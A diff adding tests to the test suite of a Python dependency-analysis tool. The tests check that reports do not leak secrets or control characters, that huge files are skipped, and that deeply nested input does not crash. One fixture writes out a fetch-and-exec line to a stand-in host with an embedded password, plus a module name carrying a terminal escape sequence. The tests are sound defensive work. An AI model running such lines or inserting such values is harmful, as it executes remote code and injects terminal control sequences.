@@ -1,3 +1,5 @@
+from repropack import analysis as analysis_module
+from repropack import scanner
 from repropack.analysis import _suggest_python, analyze
 from repropack.classify import Dependency
 from repropack.scanner import FileScan
@@ -93,3 +95,27 @@ def test_notebook_extension_tensorboard_is_a_known_package():
     nb = b'{"cells": [{"cell_type": "code", "source": "%load_ext tensorboard\\n"}]}'
     dep = next(d for d in analyze({"nb.ipynb": nb}).dependencies if d.module == "tensorboard")
     assert (dep.package, dep.needs_confirmation) == ("tensorboard", False)
+
+
+def test_issue_texts_carry_no_secrets_or_control_characters():
+    """Аудит: аргумент exec и имя модуля попадали в REPORT.md как есть — с паролем и ESC-последовательностью."""
+    source = (b'import importlib\nexec(fetch("https://user:Zq7wPlanted42@host.example/x"))\n'
+              b'importlib.import_module("os.\x1b]0;TITLE\x07")\n')
+    texts = " ".join(i.title + i.detail for i in analyze({"main.py": source}).issues)
+    assert "Zq7wPlanted42" not in texts and "\x1b" not in texts and "\x07" not in texts
+
+
+def test_huge_files_are_reported_not_parsed(monkeypatch):
+    monkeypatch.setattr(scanner, "MAX_CODE_CHARS", 50)
+    monkeypatch.setattr(analysis_module, "MAX_TOTAL_CODE_CHARS", 100)
+    result = analyze({"a.py": b"import numpy\n" * 3, "b.py": b"x = 1\n" * 10, "c.py": b"import os\n" * 2})
+    skipped = {s.path: s.findings[0].detail for s in result.scans if s.findings and s.findings[0].code == "too_large"}
+    assert set(skipped) == {"b.py", "c.py"}  # b — больше лимита на файл, c — исчерпан лимит на проект
+    assert "МБ кода" in skipped["b.py"] and "на проект" in skipped["c.py"]
+    assert [d.module for d in result.dependencies] == ["numpy"]  # a.py разобран как обычно
+    assert any(i.title == "Файл слишком большой для разбора" and i.level == "high" for i in result.issues)
+
+
+def test_deeply_nested_inputs_do_not_crash_the_analysis():
+    analyze({"main.py": b"import importlib\nimportlib.import_module(" + b"-" * 3000 + b"x)\nexec(" + b"not " * 3000
+             + b"x)\n", "pyproject.toml": b"a = " + b"[" * 3000 + b"]" * 3000 + b"\n"})
